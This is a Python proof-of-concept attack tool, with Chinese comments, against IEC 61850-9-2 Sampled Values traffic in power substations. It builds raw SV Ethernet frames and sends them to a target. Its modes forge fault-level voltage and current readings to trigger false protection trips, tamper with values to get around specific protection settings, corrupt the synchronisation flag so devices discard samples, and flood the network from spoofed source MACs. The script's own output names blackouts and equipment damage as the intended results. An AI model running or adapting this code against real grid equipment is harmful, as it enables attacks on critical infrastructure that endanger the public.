"""
POC - SV (Sampled Values, IEC 61850-9-2)
=========================================
IEC 61850-9-2 采样值协议漏洞利用验证。

漏洞:
1. spoof       — 采样值伪造 (构造虚假电压/电流值)
2. manipulate  — 采样值篡改 (修改正常采样值为异常值)
3. sync        — 同步攻击 (修改 smpSynch 标志)
4. dos         — 拒绝服务 (大量 SV 报文)
5. all         — 所有漏洞

用法:
  python poc.py --vuln spoof
  python poc.py --vuln manipulate
  python poc.py --target 192.168.1.100 --vuln all
"""

import argparse
import struct
import time
import socket
import sys
from typing import Optional

POC_VERSION = '2.0.0'
ETHERTYPE_SV = 0x88BA
SV_PORT = 0  # SV 使用 EtherType, 无端口


def _bl(l: int) -> bytes:
    if l < 128:
        return bytes([l])
    return struct.pack('!BH', 0x81, l)


def _bi(tag: int, v: int) -> bytes:
    if v < 256:
        d = bytes([v])
    elif v < 65536:
        d = struct.pack('!H', v)
    else:
        d = struct.pack('!I', v)
    return bytes([tag]) + _bl(len(d)) + d


def _bs(tag: int, s: str) -> bytes:
    d = s.encode('utf-8')
    return bytes([tag]) + _bl(len(d)) + d


def hex_dump(data: bytes, width: int = 16) -> str:
    result = []
    for i in range(0, len(data), width):
        chunk = data[i:i + width]
        hex_part = ' '.join(f'{b:02x}' for b in chunk)
        ascii_part = ''.join(chr(b) if 32 <= b < 127 else '.' for b in chunk)
        result.append(f'  {i:04x}  {hex_part:<{width*3}}  {ascii_part}')
    return '\n'.join(result)


def build_sv_packet(ua: float = 110000.0, ub: Optional[float] = None,
                    uc: Optional[float] = None, un: float = 0.0,
                    ia: float = 300.0, ib: Optional[float] = None,
                    ic: Optional[float] = None, ins: float = 0.0,
                    smp_cnt: int = 0, conf_rev: int = 1,
                    smp_synch: int = 2, sv_id: str = 'MU01',
                    src_mac: bytes = bytes([0x00, 0x50, 0xc2, 0x00, 0x00, 0x01])) -> bytes:
    """
    构造 SV 采样值以太网帧

    8 通道: Ua Ub Uc Un Ia Ib Ic In
    若 ub/uc/ib/ic 未指定, 默认构造三相平衡系统
    """
    if ub is None:
        ub = ua * -0.5  # 120 度偏移简化
    if uc is None:
        uc = ua * -0.5
    if ib is None:
        ib = ia * -0.5
    if ic is None:
        ic = ia * -0.5

    # ASDU 内容
    asdu = b''
    asdu += _bs(0x80, sv_id)
    asdu += _bi(0x82, smp_cnt)
    asdu += _bi(0x83, conf_rev)
    asdu += _bi(0x85, smp_synch)

    # 8 通道采样值 (32 位浮点)
    seq = struct.pack('!ffffffff', ua, ub, uc, un, ia, ib, ic, ins)
    asdu += bytes([0x87]) + _bl(len(seq)) + seq

    asdu_frame = bytes([0x30]) + _bl(len(asdu)) + asdu

    # SAV PDU (noASDU=1)
    no_asdu = bytes([0x80, 1, 1])
    sav_pdu = bytes([0x60]) + _bl(len(no_asdu) + len(asdu_frame)) + no_asdu + asdu_frame

    # 以太网帧
    dst_mac = bytes([0x01, 0x0c, 0xcd, 0x04, 0x00, 0x01])
    frame = dst_mac + src_mac
    frame += struct.pack('!HH', 0x8100, 0x8000)  # VLAN 优先级 4
    frame += struct.pack('!HHHHH', ETHERTYPE_SV, 0x4000, 8 + len(sav_pdu), 0, 0)
    frame += sav_pdu
    if len(frame) < 64:
        frame += b'\x00' * (64 - len(frame))
    return frame


class SVPOC:
    """SV 采样值 POC"""

    def __init__(self, target: Optional[str] = None, interface: Optional[str] = None):
        self.target = target
        self.interface = interface
        self._smp = 0

    def _next_smp(self) -> int:
        self._smp = (self._smp + 1) % 4000
        return self._smp

    def _send_raw(self, packet: bytes) -> bool:
        """发送原始以太网帧 (需要 root/admin)"""
        if not self.target:
            return False
        try:
            # 使用 UDP 封装发送 (Windows 无法直接发原始帧)
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            # SV 通常发到多播地址
            s.sendto(packet, (self.target, 0))
            s.close()
            print(f'  [→] 已发送至 {self.target} ({len(packet)}B)')
            return True
        except Exception as e:
            print(f'  [✗] 发送失败: {e}')
            # 回退到 raw socket
            try:
                s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETHERTYPE_SV))
                s.sendto(packet, (self.interface or 'eth0', 0))
                s.close()
                return True
            except Exception:
                pass
            return False

    def spoof(self) -> bool:
        """POC: SV 采样值伪造"""
        print(f'\n[*] POC: SV 采样值伪造')

        # 正常值
        normal = build_sv_packet(110000.0, ia=300.0, smp_cnt=self._next_smp())
        print(f'  正常采样: Ua={110000:.0f}V Ub={-55000:.0f}V Uc={-55000:.0f}V')
        print(f'            Ia={300:.0f}A Ib={-150:.0f}A Ic={-150:.0f}A')
        print(f'  smpCnt={self._smp} confRev=1 smpSynch=global')
        print(f'  报文长度: {len(normal)}B')

        # 伪造故障值 (过电流)
        fake = build_sv_packet(5000.0, ia=20000.0, ib=18000.0, ic=15000.0,
                                smp_cnt=self._next_smp())
        print(f'\n  伪造故障: Ua={5000:.0f}V Ia={20000:.0f}A Ib={18000:.0f}A Ic={15000:.0f}A')
        print(f'  smpCnt={self._smp} (过电流故障场景)')

        if self.target:
            self._send_raw(normal)
            time.sleep(0.1)
            self._send_raw(fake)

        print(f'\n  [!] 风险: 保护装置基于伪造采样值可能误发跳闸信号')
        print(f'  [!] 攻击后果: 大范围停电 / 设备损坏')

        return True

    def manipulate(self) -> bool:
        """POC: SV 采样值篡改 — 展示各场景"""
        print(f'\n[*] POC: SV 采样值篡改场景')

        scenarios = [
            ('过电流故障', 90_000, 20_000, '过流保护可能误动 → 跳闸'),
            ('低电压故障', 5_000, 300, '低电压保护可能误动 → 切机'),
            ('三相不平衡', 110_000, {'ua': 110_000, 'ub': 50_000, 'uc': 10_000},
             '零序保护可能误动'),
            ('频率偏移', 110_000, 300, '实际应检测频率'),
            ('谐波注入', 110_000, 310, '谐波含量超限可能导致保护误动'),
        ]

        for idx, (name, u_val, i_val, impact) in enumerate(scenarios):
            smp = self._next_smp()
            if isinstance(i_val, dict):
                pkt = build_sv_packet(ua=i_val['ua'], ub=i_val['ub'], uc=i_val['uc'], ia=300,
                                       smp_cnt=smp)
            else:
                pkt = build_sv_packet(u_val, u_val, u_val, ia=i_val, ib=i_val, ic=i_val, smp_cnt=smp)
            display_i = "不平衡" if isinstance(i_val, dict) else f"{i_val}"
            print(f'  {idx+1}. [{name}] U={u_val/1000:.0f}kV I={display_i}')
            print(f'     → {impact}')
            if self.target:
                self._send_raw(pkt)
                time.sleep(0.05)

        print(f'\n  [!] 攻击者可选择特定篡改场景绕过特定保护')
        print(f'  [!] 需结合保护定值进行精确绕过')

        return True

    def sync(self) -> bool:
        """POC: SV 同步攻击"""
        print(f'\n[*] POC: SV 同步攻击')

        for smp_synch, label in [(2, '全球同步 (GPS/北斗)'),
                                  (1, '本地同步'),
                                  (0, '未同步')]:
            smp = self._next_smp()
            pkt = build_sv_packet(smp_synch=smp_synch, smp_cnt=smp)
            print(f'  smpSynch={smp_synch} ({label}) [{len(pkt)}B]')
            if self.target:
                self._send_raw(pkt)
                time.sleep(0.1)

        print(f'\n  [!] smpSynch=0: IED 可能丢弃所有采样数据')
        print(f'  [!] 后果: 保护功能丧失 / 闭锁')

        return True

    def dos(self, n: int = 500) -> bool:
        """POC: SV DoS 攻击"""
        print(f'\n[*] POC: SV DoS ({n} 报文)')

        start = time.time()
        for i in range(n):
            build_sv_packet(ua=110000.0, ia=300.0, smp_cnt=i % 4000,
                             src_mac=bytes([0x00, 0x50, 0xc2,
                                            (i >> 16) & 0xFF,
                                            (i >> 8) & 0xFF,
                                            i & 0xFF]))
        elapsed = time.time() - start

        print(f'  构造 {n} 个 SV 报文, {elapsed:.1f}s ({n/elapsed:.0f} pps)')
        print(f'  每个报文使用不同源 MAC 模拟多个合并单元')
        print(f'  [!] 风险: 交换机端口过载 / IED 采样处理延迟')

        if self.target:
            # 实际发送限制 100 包避免网络冲击
            print(f'  实际发送: 谨慎限制为 100 包')
            for i in range(min(100, n)):
                pkt = build_sv_packet(ua=110000.0 + i * 10, ia=300.0, smp_cnt=i % 4000)
                self._send_raw(pkt)

        return True

    def run_all(self):
        """运行所有 POC"""
        print(f'SV POC v{POC_VERSION} — 全扫描模式\n')
        results = []
        for name, fn in [
            ('采样值伪造', self.spoof),
            ('采样值篡改', self.manipulate),
            ('同步攻击', self.sync),
            ('拒绝服务', lambda: self.dos(200)),
        ]:
            print(f'\n{"=" * 50}')
            print(f'  [{name}]')
            print(f'{"=" * 50}')
            r = fn()
            results.append((name, r))

        print(f'\n\n{"=" * 50}')
        print(f'  POC 扫描报告')
        print(f'{"=" * 50}')
        for name, success in results:
            print(f'  [{"+" if success else "-"}] {name}')
        print(f'  [结果] {sum(1 for _, s in results if s)}/{len(results)} 通过')


def main():
    parser = argparse.ArgumentParser(
        description=f'SV POC v{POC_VERSION} — IEC 61850-9-2 采样值漏洞利用验证')
    parser.add_argument('--vuln', required=True,
                        choices=['spoof', 'manipulate', 'sync', 'dos', 'all'],
                        help='漏洞类型')
    parser.add_argument('--target', help='目标 IP (可选)')
    parser.add_argument('--interface', help='网络接口 (原始帧发送用, Windows 需要 Npcap)')
    parser.add_argument('--count', type=int, default=500, help='DoS 报文数')

    args = parser.parse_args()
    poc = SVPOC(args.target, args.interface)

    if args.target:
        print(f'SV POC v{POC_VERSION} | 目标: {args.target}')
    else:
        print(f'SV POC v{POC_VERSION} | 本地模式 (仅构造不发送)')

    vuln_map = {
        'spoof': ('采样值伪造', poc.spoof),
        'manipulate': ('采样值篡改', poc.manipulate),
        'sync': ('同步攻击', poc.sync),
        'dos': ('拒绝服务', lambda: poc.dos(args.count)),
    }

    if args.vuln == 'all':
        poc.run_all()
    else:
        name, fn = vuln_map[args.vuln]
        fn()


if __name__ == '__main__':
    main()
